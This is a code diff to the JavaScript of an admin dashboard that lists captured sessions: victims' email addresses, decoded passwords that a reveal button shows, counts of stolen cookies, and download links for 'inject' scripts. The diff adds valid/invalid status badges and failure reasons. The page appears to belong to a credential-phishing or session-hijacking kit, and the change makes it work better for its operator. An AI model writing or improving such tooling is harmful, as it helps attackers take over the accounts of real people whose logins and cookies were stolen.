@@ -580,6 +580,7 @@
             <table class="sessions-table">
                 <thead>
                     <tr>
+                        <th>STATUS</th>
                         <th>EMAIL ADDRESS</th>
                         <th>ENCRYPTED PASSWORD</th>
                         <th>INJECTION SCRIPT</th>
@@ -740,19 +741,28 @@
                 sessions.sessions.forEach((session, index) => {
                     const row = document.createElement('tr');
                     
-                    // Decode base64 password
-                    let decodedPassword = session.password;
-                    try {
-                        decodedPassword = atob(session.password);
-                    } catch (e) {
-                        decodedPassword = session.password;
+                    // Style the row based on status
+                    if (session.status === 'invalid') {
+                        row.style.backgroundColor = 'rgba(255, 51, 51, 0.1)';
+                        row.style.borderLeft = '4px solid #ff3333';
+                    } else {
+                        row.style.backgroundColor = 'rgba(0, 255, 0, 0.05)';
+                        row.style.borderLeft = '4px solid #00ff00';
                     }
-
-                    const passwordMask = '█'.repeat(Math.min(decodedPassword.length, 12));
-
-                    row.innerHTML = `
-                        <td class="email-cell">${session.email}</td>
-                        <td>
+                    
+                    // Handle password column based on status
+                    let passwordColumn = '';
+                    if (session.status === 'valid' && session.password) {
+                        // Decode base64 password for valid sessions
+                        let decodedPassword = session.password;
+                        try {
+                            decodedPassword = atob(session.password);
+                        } catch (e) {
+                            decodedPassword = session.password;
+                        }
+                        const passwordMask = '█'.repeat(Math.min(decodedPassword.length, 12));
+                        
+                        passwordColumn = `
                             <div class="password-container">
                                 <div id="password-${index}" class="password-masked">
                                     ${passwordMask}
@@ -760,24 +770,42 @@
                                 <button onclick="togglePassword(${index}, '${decodedPassword.replace(/'/g, "\\'")}')"
                                     id="reveal-btn-${index}" class="reveal-btn">SHOW</button>
                             </div>
-                        </td>
-                        <td>
-                            ${session.injectFilename ? 
-                                `<a href="/api/admin/download-inject/${session.injectFilename}?token=${encodeURIComponent(getStoredToken())}" 
-                                   class="download-btn" download>
-                                    DOWNLOAD INJECT
-                                </a>` :
-                                `<span style="color: #666;">NO INJECT SCRIPT</span>`
-                            }
-                        </td>
+                        `;
+                    } else {
+                        passwordColumn = `<span style="color: #666;">N/A - ${session.reason || 'FAILED ENTRY'}</span>`;
+                    }
+
+                    // Handle inject script column
+                    let injectColumn = '';
+                    if (session.status === 'valid' && session.injectFilename) {
+                        injectColumn = `<a href="/api/admin/download-inject/${session.injectFilename}?token=${encodeURIComponent(getStoredToken())}" 
+                                           class="download-btn" download>
+                                            DOWNLOAD INJECT
+                                        </a>`;
+                    } else {
+                        injectColumn = `<span style="color: #666;">NO INJECT SCRIPT</span>`;
+                    }
+
+                    // Status badge
+                    const statusBadge = session.status === 'valid' 
+                        ? `<span style="color: #00ff66; font-weight: bold;">✅ VALID</span>`
+                        : `<span style="color: #ff3333; font-weight: bold;">❌ INVALID</span>`;
+
+                    row.innerHTML = `
+                        <td>${statusBadge}</td>
+                        <td class="email-cell">${session.email}</td>
+                        <td>${passwordColumn}</td>
+                        <td>${injectColumn}</td>
                         <td>
                             <div>ID: ${session.id}</div>
                             <div class="session-info">
                                 TIMESTAMP: ${new Date(session.timestamp).toLocaleString()}
                             </div>
-                            <div class="session-info">
-                                COOKIES: ${session.totalCookies} ENCRYPTED
-                            </div>
+                            ${session.status === 'valid' ? 
+                                `<div class="session-info">COOKIES: ${session.totalCookies} ENCRYPTED</div>` :
+                                `<div class="session-info">REASON: ${session.reason || 'Unknown'}</div>
+                                 ${session.errorMessage ? `<div class="session-info">ERROR: ${session.errorMessage}</div>` : ''}`
+                            }
                         </td>
                     `;
                     
